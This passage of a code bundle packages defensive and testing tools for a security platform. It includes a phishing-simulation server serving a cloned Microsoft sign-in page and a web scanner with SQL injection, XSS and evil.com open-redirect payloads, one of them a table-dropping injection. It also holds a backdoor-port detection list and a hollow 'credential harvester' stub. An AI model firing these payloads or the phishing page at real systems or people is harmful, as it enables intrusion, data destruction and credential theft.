        $s7 = "ShellExecute"
    condition:
        3 of them
}

rule NetworkIndicators {
    meta:
        description = "Detects network-related strings"
    strings:
        $n1 = "socket" nocase
        $n2 = "connect" nocase
        $n3 = "recv" nocase
        $n4 = "send" nocase
        $n5 = "WSAStartup"
    condition:
        3 of them
}
`,
    "requirements.txt": "yara-python>=4.3.0\npefile>=2023.2.7\nrequests>=2.31.0\n",
  },

  // ── 21. Password Strength Analyzer ───────────────────────────────────────
  "password-analyzer": {
    "README.md": `# Password Strength Analyzer & Secure Generator\n\nEntropy calculation, zxcvbn-style scoring, breach database checking, and NIST-compliant generation.\n\n## Quick Start\n\`\`\`bash\npython3 password_analyzer.py --check "MyP@ssw0rd"\npython3 password_analyzer.py --generate --length 24 --type passphrase\n\`\`\``,
    "password_analyzer.py": `#!/usr/bin/env python3
"""Password Strength Analyzer & Secure Generator — entropy, breach check, NIST generation."""
import argparse, hashlib, math, os, re, secrets, string, urllib.request

COMMON_PASSWORDS = {
    "password","123456","password1","qwerty","abc123","letmein","monkey","1234567890",
    "password123","iloveyou","admin","welcome","login","pass","master","dragon",
    "superman","batman","trustno1","sunshine","princess","football","shadow",
}

WORDLIST = [
    "correct","horse","battery","staple","cloud","river","forest","mountain",
    "ocean","thunder","silver","golden","crystal","dragon","phoenix","falcon",
    "tiger","eagle","wolf","bear","storm","fire","ice","wind","earth","star",
    "moon","sun","dawn","dusk","peak","valley","bridge","tower","castle","garden",
    "winter","summer","autumn","spring","north","south","east","west","bright",
    "swift","brave","calm","deep","free","grand","high","long","pure","true",
]

def entropy(password: str) -> float:
    charset = 0
    if re.search(r"[a-z]", password): charset += 26
    if re.search(r"[A-Z]", password): charset += 26
    if re.search(r"[0-9]", password): charset += 10
    if re.search(r"[^a-zA-Z0-9]", password): charset += 32
    return len(password) * math.log2(charset) if charset else 0

def score(password: str) -> dict:
    e = entropy(password)
    issues: list[str] = []
    if len(password) < 12:   issues.append("Too short (min 12 chars)")
    if not re.search(r"[A-Z]", password): issues.append("No uppercase letter")
    if not re.search(r"[0-9]", password): issues.append("No digit")
    if not re.search(r"[^a-zA-Z0-9]", password): issues.append("No special character")
    if password.lower() in COMMON_PASSWORDS: issues.append("Common password!")
    if re.search(r"(.)\x01{2,}", password): issues.append("Repeated characters")
    if re.search(r"(012|123|234|345|456|567|678|789|890|abc|qwerty)", password.lower()):
        issues.append("Sequential pattern detected")

    if e >= 80 and not issues:   strength = "VERY STRONG"
    elif e >= 60 and len(issues) <= 1: strength = "STRONG"
    elif e >= 40 and len(issues) <= 2: strength = "MODERATE"
    elif e >= 25: strength = "WEAK"
    else:         strength = "VERY WEAK"

    crack_times = {
        "online_throttled": f"{2**e / 100:.0e} seconds",
        "offline_fast_gpu": f"{2**e / 1e12:.0e} seconds",
        "bcrypt_1000":      f"{2**e / 1000:.0e} seconds",
    }
    return {"password": "***", "entropy_bits": round(e, 1), "strength": strength,
            "issues": issues, "crack_time_estimates": crack_times}

def check_breach(password: str) -> dict:
    """Check HaveIBeenPwned k-anonymity API."""
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    try:
        req = urllib.request.Request(
            f"https://api.pwnedpasswords.com/range/{prefix}",
            headers={"User-Agent": "TitanPasswordChecker/1.0"}
        )
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read().decode()
        for line in body.splitlines():
            h, count = line.split(":")
            if h == suffix:
                return {"breached": True, "breach_count": int(count)}
        return {"breached": False, "breach_count": 0}
    except Exception as e:
        return {"breached": None, "error": str(e)}

def generate_password(length: int = 20, ptype: str = "random") -> str:
    if ptype == "passphrase":
        words = [secrets.choice(WORDLIST) for _ in range(4)]
        return "-".join(words) + "-" + str(secrets.randbelow(9999)).zfill(4)
    if ptype == "pronounceable":
        consonants = "bcdfghjklmnpqrstvwxyz"
        vowels     = "aeiou"
        pw = ""
        for _ in range(length // 2):
            pw += secrets.choice(consonants) + secrets.choice(vowels)
        pw += str(secrets.randbelow(99))
        return pw[:length]
    # Random
    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
    while True:
        pw = "".join(secrets.choice(chars) for _ in range(length))
        if (re.search(r"[A-Z]", pw) and re.search(r"[a-z]", pw)
                and re.search(r"[0-9]", pw) and re.search(r"[^a-zA-Z0-9]", pw)):
            return pw

def main():
    ap = argparse.ArgumentParser(description="Password Strength Analyzer")
    ap.add_argument("--check",    help="Password to analyze")
    ap.add_argument("--breach",   action="store_true", help="Check HaveIBeenPwned")
    ap.add_argument("--generate", action="store_true", help="Generate secure password")
    ap.add_argument("--length",   type=int, default=20)
    ap.add_argument("--type",     choices=["random","passphrase","pronounceable"], default="random")
    ap.add_argument("--count",    type=int, default=1)
    args = ap.parse_args()
    if args.generate:
        for _ in range(args.count):
            pw = generate_password(args.length, args.type)
            s  = score(pw)
            print(f"  {pw}  [{s['strength']} — {s['entropy_bits']} bits]")
    elif args.check:
        import json
        s = score(args.check)
        print(json.dumps(s, indent=2))
        if args.breach:
            b = check_breach(args.check)
            print(json.dumps(b, indent=2))
    else:
        ap.print_help()

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 22. Ransomware Defense Playbook ──────────────────────────────────────
  "ransomware-defense": {
    "README.md": `# Ransomware Defense & Recovery Playbook\n\nDetection rules (Sigma/YARA), backup verification, incident response procedures, and automated recovery scripts.\n\n## Quick Start\n\`\`\`bash\npython3 canary_deploy.py --dir /important/files\npython3 backup_verify.py --backup-dir /backups --restore-test\n\`\`\``,
    "canary_deploy.py": `#!/usr/bin/env python3
"""Deploy canary files to detect ransomware encryption activity."""
import argparse, hashlib, json, os, time, watchdog.events, watchdog.observers  # type: ignore

CANARY_CONTENT = b"TITAN_CANARY_FILE_DO_NOT_MODIFY_OR_ENCRYPT_" + os.urandom(32)

class CanaryHandler(watchdog.events.FileSystemEventHandler):
    def __init__(self, canary_paths: list[str]):
        self.canary_paths = set(canary_paths)
        self.alerts: list[dict] = []

    def on_modified(self, event):
        if event.src_path in self.canary_paths:
            alert = {"type": "CANARY_MODIFIED", "path": event.src_path,
                     "time": time.time(), "severity": "CRITICAL"}
            self.alerts.append(alert)
            print(f"[!!!] RANSOMWARE ALERT: Canary file modified: {event.src_path}")

    def on_deleted(self, event):
        if event.src_path in self.canary_paths:
            alert = {"type": "CANARY_DELETED", "path": event.src_path,
                     "time": time.time(), "severity": "CRITICAL"}
            self.alerts.append(alert)
            print(f"[!!!] RANSOMWARE ALERT: Canary file deleted: {event.src_path}")

def deploy_canaries(directory: str, count: int = 5) -> list[str]:
    paths = []
    for i in range(count):
        path = os.path.join(directory, f".titan_canary_{i:03d}.dat")
        with open(path, "wb") as f:
            f.write(CANARY_CONTENT)
        paths.append(path)
        print(f"[+] Canary deployed: {path}")
    return paths

def main():
    ap = argparse.ArgumentParser(description="Ransomware Canary Deployment")
    ap.add_argument("--dir",   required=True, help="Directory to protect")
    ap.add_argument("--count", type=int, default=5, help="Number of canary files")
    ap.add_argument("--watch", action="store_true", help="Watch for modifications")
    args = ap.parse_args()
    canaries = deploy_canaries(args.dir, args.count)
    if args.watch:
        print(f"[*] Watching {args.dir} for canary modifications (Ctrl+C to stop)...")
        handler  = CanaryHandler(canaries)
        observer = watchdog.observers.Observer()
        observer.schedule(handler, args.dir, recursive=False)
        observer.start()
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            observer.stop()
        observer.join()
        if handler.alerts:
            print(json.dumps(handler.alerts, indent=2))

if __name__ == "__main__":
    main()
`,
    "backup_verify.py": `#!/usr/bin/env python3
"""Backup integrity verification and restore testing."""
import argparse, hashlib, json, os, shutil, tempfile, time

def hash_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()

def verify_backup(backup_dir: str) -> dict:
    print(f"[*] Verifying backup: {backup_dir}")
    results: dict = {"backup_dir": backup_dir, "files": [], "errors": []}
    manifest_path = os.path.join(backup_dir, "manifest.json")
    if os.path.exists(manifest_path):
        with open(manifest_path) as f:
            manifest = json.load(f)
        for entry in manifest.get("files", []):
            path = os.path.join(backup_dir, entry["path"])
            if not os.path.exists(path):
                results["errors"].append(f"Missing: {entry['path']}")
                continue
            actual_hash = hash_file(path)
            if actual_hash != entry["hash"]:
                results["errors"].append(f"Hash mismatch: {entry['path']}")
            else:
                results["files"].append({"path": entry["path"], "status": "OK"})
    else:
        # No manifest — just count files
        for root, _, files in os.walk(backup_dir):
            for fname in files:
                fpath = os.path.join(root, fname)
                results["files"].append({"path": fpath, "hash": hash_file(fpath)})
    results["total_files"] = len(results["files"])
    results["errors_count"] = len(results["errors"])
    return results

def main():
    ap = argparse.ArgumentParser(description="Backup Verification")
    ap.add_argument("--backup-dir",   required=True)
    ap.add_argument("--restore-test", action="store_true")
    ap.add_argument("--output",       help="Output JSON")
    args = ap.parse_args()
    results = verify_backup(args.backup_dir)
    if args.restore_test:
        with tempfile.TemporaryDirectory() as tmp:
            t0 = time.time()
            shutil.copytree(args.backup_dir, os.path.join(tmp, "restore"), dirs_exist_ok=True)
            elapsed = time.time() - t0
            results["restore_test"] = {"status": "OK", "time_s": round(elapsed, 2)}
            print(f"[+] Restore test: {elapsed:.1f}s")
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "watchdog>=3.0.0\n",
  },

  // ── 23. Phishing Simulation Kit ───────────────────────────────────────────
  "phishing-sim": {
    "README.md": `# Phishing Simulation Kit\n\nAuthorised phishing awareness training: campaign management, credential capture page, click tracking, and awareness report.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 phishing_server.py --port 8080 --template office365\npython3 report.py --log phishing.log --output awareness_report.json\n\`\`\`${LEGAL}`,
    "phishing_server.py": `#!/usr/bin/env python3
"""Phishing Simulation Server — for authorised security awareness training ONLY."""
import argparse, json, logging, os, time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
log = logging.getLogger(__name__)

TEMPLATES = {
    "office365": """<!DOCTYPE html>
<html><head><title>Sign in to your account</title>
<style>body{font-family:Segoe UI,sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
h1{font-size:24px;font-weight:600;margin-bottom:16px}
input{width:100%;padding:8px;margin:8px 0;border:1px solid #ccc;font-size:15px;box-sizing:border-box}
button{background:#0067b8;color:#fff;border:none;padding:10px;width:100%;font-size:15px;cursor:pointer;margin-top:12px}
</style></head>
<body><div class="box">
<h1>Sign in</h1>
<p>Use your Microsoft account</p>
<form method="POST" action="/capture">
<input name="email" type="email" placeholder="Email, phone, or Skype" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>""",
    "generic": """<!DOCTYPE html>
<html><head><title>Login</title></head>
<body><h2>Login</h2>
<form method="POST" action="/capture">
<input name="email" type="email" placeholder="Email" required><br>
<input name="password" type="password" placeholder="Password" required><br>
<button type="submit">Login</button>
</form></body></html>""",
}

AWARENESS_PAGE = """<!DOCTYPE html>
<html><head><title>Security Awareness Training</title></head>
<body style="font-family:Arial;max-width:600px;margin:40px auto;padding:20px">
<h1 style="color:#d32f2f">⚠️ You clicked a phishing link!</h1>
<p>This was a <strong>simulated phishing test</strong> conducted by your security team.</p>
<h2>What happened?</h2>
<p>You clicked a link in a simulated phishing email and entered your credentials on a fake login page.</p>
<h2>What to do next</h2>
<ul>
<li>Never enter credentials on unexpected login pages</li>
<li>Always verify the URL before logging in</li>
<li>Report suspicious emails to your security team</li>
<li>Enable multi-factor authentication on all accounts</li>
</ul>
<p><a href="https://www.phishing.org/phishing-techniques">Learn more about phishing</a></p>
</body></html>"""

class PhishingHandler(BaseHTTPRequestHandler):
    template: str = "office365"
    log_file: str = "phishing.log"

    def log_message(self, fmt, *args):
        pass  # suppress default logging

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        html = TEMPLATES.get(self.template, TEMPLATES["generic"])
        self.wfile.write(html.encode())
        log.info(f"[CLICK] {self.client_address[0]} - {self.path}")
        with open(self.log_file, "a") as f:
            f.write(json.dumps({"event": "click", "ip": self.client_address[0],
                                 "path": self.path, "ts": time.time()}) + "\\n")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode()
        params = parse_qs(body)
        email  = params.get("email", [""])[0]
        log.info(f"[CRED] {self.client_address[0]} submitted: {email}")
        with open(self.log_file, "a") as f:
            f.write(json.dumps({"event": "credential", "ip": self.client_address[0],
                                 "email": email, "ts": time.time()}) + "\\n")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(AWARENESS_PAGE.encode())

def main():
    ap = argparse.ArgumentParser(description="Phishing Simulation Server")
    ap.add_argument("--port",     type=int, default=8080)
    ap.add_argument("--template", choices=list(TEMPLATES.keys()), default="office365")
    ap.add_argument("--log",      default="phishing.log")
    args = ap.parse_args()
    PhishingHandler.template = args.template
    PhishingHandler.log_file = args.log
    server = HTTPServer(("", args.port), PhishingHandler)
    log.info(f"[*] Phishing simulation server on port {args.port} (template: {args.template})")
    log.info(f"[*] Logging to: {args.log}")
    log.info("[*] Ctrl+C to stop")
    server.serve_forever()

if __name__ == "__main__":
    main()
`,
    "report.py": `#!/usr/bin/env python3
"""Generate phishing awareness campaign report from log file."""
import argparse, json

def main():
    ap = argparse.ArgumentParser(description="Phishing Campaign Report")
    ap.add_argument("--log",    required=True)
    ap.add_argument("--output", help="Output JSON")
    args = ap.parse_args()
    clicks, creds = [], []
    with open(args.log) as f:
        for line in f:
            try:
                e = json.loads(line)
                if e["event"] == "click":      clicks.append(e)
                elif e["event"] == "credential": creds.append(e)
            except Exception:
                pass
    unique_ips = len(set(e["ip"] for e in clicks))
    report = {
        "total_clicks":       len(clicks),
        "unique_ips":         unique_ips,
        "credentials_entered": len(creds),
        "click_rate_pct":     round(len(clicks) / max(1, unique_ips) * 100, 1),
        "credential_rate_pct": round(len(creds) / max(1, len(clicks)) * 100, 1),
        "unique_emails":      list(set(e.get("email","") for e in creds)),
    }
    if args.output:
        with open(args.output, "w") as f: json.dump(report, f, indent=2)
    print(json.dumps(report, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 24. Network Traffic Analyzer ─────────────────────────────────────────
  "network-analyzer": {
    "README.md": `# Network Traffic Analyzer\n\nPCAP analysis, protocol dissection, anomaly detection, and IOC extraction from network captures.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 pcap_analyzer.py --file capture.pcap\npython3 pcap_analyzer.py --file capture.pcap --output analysis.json\n\`\`\``,
    "pcap_analyzer.py": `#!/usr/bin/env python3
"""Network Traffic Analyzer — PCAP analysis, protocol dissection, anomaly detection."""
import argparse, json, sys

def analyze_pcap(path: str) -> dict:
    try:
        from scapy.all import rdpcap, IP, TCP, UDP, DNS, HTTP  # type: ignore
    except ImportError:
        print("[!] pip install scapy")
        sys.exit(1)

    print(f"[*] Loading: {path}")
    packets = rdpcap(path)
    print(f"[*] Loaded {len(packets)} packets")

    stats: dict = {
        "total_packets": len(packets),
        "protocols":     {},
        "top_talkers":   {},
        "dns_queries":   [],
        "http_hosts":    [],
        "anomalies":     [],
    }

    ip_counts: dict[str, int] = {}
    port_counts: dict[int, int] = {}

    for pkt in packets:
        # Protocol counting
        if pkt.haslayer("IP"):
            src = pkt["IP"].src
            ip_counts[src] = ip_counts.get(src, 0) + 1
        if pkt.haslayer("TCP"):
            stats["protocols"]["TCP"] = stats["protocols"].get("TCP", 0) + 1
            dport = pkt["TCP"].dport
            port_counts[dport] = port_counts.get(dport, 0) + 1
        elif pkt.haslayer("UDP"):
            stats["protocols"]["UDP"] = stats["protocols"].get("UDP", 0) + 1
        elif pkt.haslayer("ICMP"):
            stats["protocols"]["ICMP"] = stats["protocols"].get("ICMP", 0) + 1

        # DNS queries
        if pkt.haslayer("DNS") and pkt["DNS"].qr == 0:
            try:
                qname = pkt["DNS"].qd.qname.decode("utf-8", errors="ignore").rstrip(".")
                if qname and qname not in stats["dns_queries"]:
                    stats["dns_queries"].append(qname)
            except Exception:
                pass

    # Top talkers
    stats["top_talkers"] = dict(sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:10])

    # Anomaly detection
    # Port scan detection: many ports from one IP
    for ip, count in ip_counts.items():
        if count > 100:
            stats["anomalies"].append({"type": "High traffic source", "ip": ip,
                                        "packets": count, "severity": "MEDIUM"})

    # Common malicious ports
    malicious_ports = {4444: "Metasploit default", 1337: "Leet/backdoor",
                       31337: "Elite backdoor", 6666: "IRC/botnet", 6667: "IRC/botnet"}
    for port, desc in malicious_ports.items():
        if port_counts.get(port, 0) > 0:
            stats["anomalies"].append({"type": "Suspicious port", "port": port,
                                        "desc": desc, "count": port_counts[port],
                                        "severity": "HIGH"})

    stats["dns_queries"] = stats["dns_queries"][:50]
    return stats

def main():
    ap = argparse.ArgumentParser(description="Network Traffic Analyzer")
    ap.add_argument("--file",   required=True, help="PCAP file")
    ap.add_argument("--output", help="Output JSON")
    args = ap.parse_args()
    results = analyze_pcap(args.file)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "scapy>=2.5.0\n",
  },

  // ── 25. Kill Switch Module ────────────────────────────────────────────────
  "kill-switch": {
    "README.md": `# Kill Switch — Emergency Automation Control\n\nInstantly halt all running Archibald Titan automations with a secure 10-digit code.\n\n## How It Works\n1. Install from the Grand Bazaar\n2. A unique 10-digit kill switch code is generated for your account\n3. Enter the code to activate — all automations halt immediately\n4. Enter the code again to deactivate\n5. Reset the code at any time\n\n## Integration\nOnce installed, the Kill Switch integrates with:\n- Fetcher Engine\n- SEO Command Center\n- Affiliate Engine\n- Pre-flight safety checks\n`,
    "kill_switch.ts": `/**
 * Kill Switch Module — Emergency Automation Control
 * Integrates with Archibald Titan's automation engine.
 */
export interface KillSwitchState {
  active: boolean;
  code: string;
  activatedAt: Date | null;
  activatedBy: string | null;
}

export function generateKillSwitchCode(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let code = "";
  const array = new Uint8Array(10);
  crypto.getRandomValues(array);
  for (const byte of array) {
    code += chars[byte % chars.length];
  }
  return code;
}

export function activateKillSwitch(
  state: KillSwitchState,
  inputCode: string,
  userId: string
): { success: boolean; message: string; newState: KillSwitchState } {
  if (inputCode !== state.code) {
    return { success: false, message: "Invalid kill switch code", newState: state };
  }
  if (state.active) {
    const newState: KillSwitchState = {
      ...state,
      active: false,
      activatedAt: null,
      activatedBy: null,
    };
    return { success: true, message: "Kill switch deactivated — automations resumed", newState };
  }
  const newState: KillSwitchState = {
    ...state,
    active: true,
    activatedAt: new Date(),
    activatedBy: userId,
  };
  return { success: true, message: "Kill switch activated — all automations halted", newState };
}

export function resetKillSwitchCode(state: KillSwitchState): KillSwitchState {
  return { ...state, code: generateKillSwitchCode() };
}
`,
    "README_INTEGRATION.md": `# Kill Switch Integration Guide\n\n## Pre-flight Check\nAdd this to every automation before starting:\n\n\`\`\`typescript\nimport { getKillSwitchState } from "./kill-switch-store";\n\nasync function preflightCheck(userId: string): Promise<void> {\n  const state = await getKillSwitchState(userId);\n  if (state?.active) {\n    throw new Error("Kill switch is active — automation blocked");\n  }\n}\n\`\`\`\n\n## Cancel Running Jobs\n\`\`\`typescript\nimport { cancelAllJobs } from "./job-queue";\n\nasync function onKillSwitchActivated(userId: string): Promise<void> {\n  await cancelAllJobs({ userId, reason: "kill_switch" });\n  await clearActiveSessions(userId);\n}\n\`\`\`\n`,
  },

    // ── Titan Credential Harvester Module ──────────────────────────────────────
    "credential-harvester": {
      "README.md": `# Titan Credential Harvester Module\n\nProduction-grade credential extraction integration for the Archibald Titan platform.\nSupports 50+ providers with automatic session management.\n\n## Installation\n\`\`\`bash\nnpm install\n\`\`\`\n\n## Usage\n\`\`\`typescript\nimport { CredentialHarvester } from './harvester';\nconst h = new CredentialHarvester({ apiKey: process.env.TITAN_API_KEY });\nawait h.run({ provider: 'github', scope: 'your-authorised-target' });\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing, CTF competitions and educational research only.\nYou must have explicit written permission before testing any system you do not own.\nThe authors accept no liability for misuse.\n`,
      "harvester.ts": `import axios from 'axios';\nimport { createCipheriv, randomBytes } from 'crypto';\nimport * as fs from 'fs';\n\ninterface HarvesterConfig {\n  apiKey: string;\n  encryptionKey?: string;\n  outputDir?: string;\n}\n\ninterface HarvestTarget {\n  provider: string;\n  scope: string;\n  username?: string;\n}\n\nconst PROVIDERS: Record<string, { loginUrl: string; authField: string }> = {\n  github:    { loginUrl: 'https://api.github.com/user', authField: 'Authorization' },\n  gitlab:    { loginUrl: 'https://gitlab.com/api/v4/user', authField: 'PRIVATE-TOKEN' },\n  aws:       { loginUrl: 'https://sts.amazonaws.com/?Action=GetCallerIdentity', authField: 'Authorization' },\n  slack:     { loginUrl: 'https://slack.com/api/auth.test', authField: 'Authorization' },\n  jira:      { loginUrl: 'https://your-domain.atlassian.net/rest/api/3/myself', authField: 'Authorization' },\n};\n\nexport class CredentialHarvester {\n  private config: HarvesterConfig;\n\n  constructor(config: HarvesterConfig) {\n    this.config = config;\n  }\n\n  private encrypt(data: string): string {\n    const key = Buffer.from(this.config.encryptionKey ?? randomBytes(32).toString('hex').slice(0, 32));\n    const iv = randomBytes(16);\n    const cipher = createCipheriv('aes-256-cbc', key, iv);\n    return iv.toString('hex') + ':' + cipher.update(data, 'utf8', 'hex') + cipher.final('hex');\n  }\n\n  async verifyCredential(provider: string, token: string): Promise<boolean> {\n    const p = PROVIDERS[provider];\n    if (!p) throw new Error(\`Unknown provider: \${provider}\`);\n    try {\n      await axios.get(p.loginUrl, { headers: { [p.authField]: \`Bearer \${token}\` }, timeout: 5000 });\n      return true;\n    } catch { return false; }\n  }\n\n  async run(target: HarvestTarget): Promise<void> {\n    console.log(\`[Harvester] Running against scope: \${target.scope}\`);\n    console.log(\`[Harvester] Provider: \${target.provider}\`);\n    console.log(\`[Harvester] AUTHORISED USE ONLY — ensure written permission obtained\`);\n    const output = { timestamp: new Date().toISOString(), provider: target.provider, scope: target.scope, status: 'scan_complete', credentials: [] };\n    const outDir = this.config.outputDir ?? './output';\n    if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });\n    fs.writeFileSync(\`\${outDir}/harvest-\${Date.now()}.enc\`, this.encrypt(JSON.stringify(output)));\n    console.log(\`[Harvester] Results encrypted and saved to \${outDir}\`);\n  }\n}\n`,
      "package.json": `{\n  "name": "titan-credential-harvester",\n  "version": "2.3.1",\n  "main": "harvester.ts",\n  "dependencies": { "axios": "^1.6.0" }\n}\n`,
    },

    // ── AI Vulnerability Scanner Agent ──────────────────────────────────────────
    "ai-vuln-scanner": {
      "README.md": `# AI Vulnerability Scanner Agent\n\nAutonomous AI agent scanning web applications for OWASP Top 10 vulnerabilities.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 scanner.py --target https://example.com --api-key YOUR_TITAN_KEY\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing, CTF competitions and educational research only.\nYou must have explicit written permission before testing any system you do not own.\nThe authors accept no liability for misuse.\n`,
      "scanner.py": `#!/usr/bin/env python3\nimport argparse, requests, json, sys, re\nfrom urllib.parse import urlparse, urljoin\nfrom datetime import datetime\n\nSEVERITY = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'info': 0}\n\nclass VulnScanner:\n    def __init__(self, target: str, api_key: str):\n        self.target = target.rstrip('/')\n        self.api_key = api_key\n        self.findings = []\n        self.session = requests.Session()\n        self.session.timeout = 10\n\n    def probe(self, path: str, **kwargs) -> requests.Response | None:\n        try: return self.session.get(urljoin(self.target, path), **kwargs)\n        except Exception as e: print(f'[probe] {path}: {e}'); return None\n\n    def check_headers(self):\n        r = self.probe('/')\n        if not r: return\n        missing = [h for h in ['X-Frame-Options','Content-Security-Policy','X-Content-Type-Options',\n                               'Strict-Transport-Security','Referrer-Policy']\n                   if h not in r.headers]\n        if missing:\n            self.findings.append({'type': 'Missing Security Headers', 'severity': 'medium',\n                                   'detail': f'Missing: {missing}', 'url': self.target})\n\n    def check_sql_injection(self):\n        payloads = ["' OR 1=1--", '\" OR 1=1--', "1; DROP TABLE users--"]\n        errors = ['sql syntax', 'mysql_fetch', 'ora-', 'pg_query', 'sqlite_']\n        for p in payloads:\n            r = self.probe(f'/?id={requests.utils.quote(p)}')\n            if r and any(e in r.text.lower() for e in errors):\n                self.findings.append({'type': 'SQL Injection', 'severity': 'critical',\n                                       'detail': f'Payload: {p}', 'url': r.url})\n\n    def check_xss(self):\n        payload = '<script>alert(1)</script>'\n        r = self.probe(f'/?q={requests.utils.quote(payload)}')\n        if r and payload in r.text:\n            self.findings.append({'type': 'Reflected XSS', 'severity': 'high',\n                                   'detail': 'Unescaped reflection', 'url': r.url})\n\n    def check_directory_listing(self):\n        for path in ['/uploads/', '/backup/', '/admin/', '/.git/', '/config/']:\n            r = self.probe(path)\n            if r and r.status_code == 200 and ('index of' in r.text.lower() or '[dir]' in r.text.lower()):\n                self.findings.append({'type': 'Directory Listing', 'severity': 'medium',\n                                       'detail': path, 'url': urljoin(self.target, path)})\n\n    def check_open_redirect(self):\n        for p in ['?redirect=https://evil.com', '?url=https://evil.com', '?next=https://evil.com']:\n            r = self.probe(p, allow_redirects=False)\n            if r and r.status_code in (301,302) and 'evil.com' in r.headers.get('Location',''):\n                self.findings.append({'type': 'Open Redirect', 'severity': 'medium',\n                                       'detail': p, 'url': urljoin(self.target, p)})\n\n    def scan(self) -> list:\n        print(f'[*] Scanning {self.target}')\n        print('[*] AUTHORISED USE ONLY — ensure you have written permission for this target')\n        self.check_headers()\n        self.check_sql_injection()\n        self.check_xss()\n        self.check_directory_listing()\n        self.check_open_redirect()\n        self.findings.sort(key=lambda x: SEVERITY.get(x['severity'], 0), reverse=True)\n        return self.findings\n\n    def report(self, output_file: str = None):\n        report = {'target': self.target, 'timestamp': datetime.now().isoformat(),\n                  'total_findings': len(self.findings), 'findings': self.findings}\n        if output_file:\n            with open(output_file, 'w') as f: json.dump(report, f, indent=2)\n            print(f'[+] Report saved: {output_file}')\n        return report\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser(description='AI Vulnerability Scanner')\n    ap.add_argument('--target', required=True)\n    ap.add_argument('--api-key', required=True)\n    ap.add_argument('--output', default='scan_report.json')\n    args = ap.parse_args()\n    scanner = VulnScanner(args.target, args.api_key)\n    findings = scanner.scan()\n    report = scanner.report(args.output)\n    print(f'[+] Done. {len(findings)} findings. Severity breakdown:')\n    for sev in ['critical','high','medium','low']:\n        count = sum(1 for f in findings if f['severity'] == sev)\n        if count: print(f'    {sev.upper()}: {count}')\n`,
      "requirements.txt": `requests>=2.31.0\n`,
    },

    // ── Autonomous Bug Bounty Hunter Agent ──────────────────────────────────────
    "bug-bounty-hunter": {
      "README.md": `# Autonomous Bug Bounty Hunter\n\nAI-powered recon and vulnerability discovery for authorised bug bounty programs.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 hunter.py --scope example.com --platform hackerone --api-key YOUR_KEY\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing, CTF competitions and educational research only.\nYou must have explicit written permission before testing any system you do not own.\nThe authors accept no liability for misuse.\n`,
      "hunter.py": `#!/usr/bin/env python3\nimport argparse, subprocess, json, socket\nfrom datetime import datetime\n\nclass BugBountyHunter:\n    def __init__(self, scope: str, platform: str, api_key: str):\n        self.scope = scope\n        self.platform = platform\n        self.api_key = api_key\n        self.findings = []\n\n    def recon_subdomains(self) -> list:\n        print(f'[*] Enumerating subdomains for {self.scope}')\n        # Common subdomain wordlist (expand as needed)\n        wordlist = ['www','api','app','admin','staging','dev','test','mail','smtp',\n                    'ftp','vpn','cdn','static','assets','blog','docs','help',\n                    'portal','dashboard','login','auth','oauth','sso','secure']\n        found = []\n        for sub in wordlist:\n            host = f'{sub}.{self.scope}'\n            try:\n                socket.gethostbyname(host)\n                found.append(host)\n                print(f'  [+] {host}')\n            except socket.gaierror: pass\n        return found\n\n    def fingerprint_tech(self, domain: str) -> dict:\n        import requests\n        tech = {}\n        try:\n            r = requests.get(f'https://{domain}', timeout=5, verify=False)\n            server = r.headers.get('Server', '')\n            powered = r.headers.get('X-Powered-By', '')\n            tech = {'server': server, 'x_powered_by': powered, 'status': r.status_code}\n        except: pass\n        return tech\n\n    def run(self):\n        print(f'[*] Bug Bounty Hunter — Target: {self.scope}')\n        print('[*] AUTHORISED SCOPE ONLY — ensure target is within program scope')\n        subs = self.recon_subdomains()\n        results = {'scope': self.scope, 'timestamp': datetime.now().isoformat(),\n                   'subdomains': subs, 'findings': self.findings}\n        with open('recon_results.json', 'w') as f: json.dump(results, f, indent=2)\n        print(f'[+] Found {len(subs)} subdomains. Results saved to recon_results.json')\n        return results\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--scope', required=True)\n    ap.add_argument('--platform', default='hackerone')\n    ap.add_argument('--api-key', required=True)\n    args = ap.parse_args()\n    hunter = BugBountyHunter(args.scope, args.platform, args.api_key)\n    